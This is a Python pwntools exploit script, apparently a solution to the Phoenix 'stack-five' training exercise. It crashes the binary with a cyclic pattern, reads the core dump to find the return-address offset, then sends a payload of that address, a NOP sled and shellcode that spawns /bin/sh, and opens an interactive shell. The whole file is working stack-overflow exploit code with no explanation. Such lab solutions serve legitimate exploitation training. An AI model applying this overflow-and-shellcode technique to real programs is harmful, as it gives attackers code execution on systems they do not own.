#!/usr/bin/env python3
from glob import glob
from pwn import *

path = "/opt/phoenix/amd64/stack-five"
context.binary = path

io = process(path)
io.sendline(cyclic(300))
io.wait()
pid = io.pid
corefile_path = glob(f"/var/lib/coredumps/core.*.{pid}")[0]
print(corefile_path)
core = Corefile(corefile_path)
offset = cyclic_find(core.rip & 0xFFFFFFFF)

io = process(path)
elf = io.elf
payload = flat([{offset: p64(core.rsp)}, b"\x90" * 0x1FF, asm(shellcraft.sh())])
io.sendline(payload)
io.interactive()
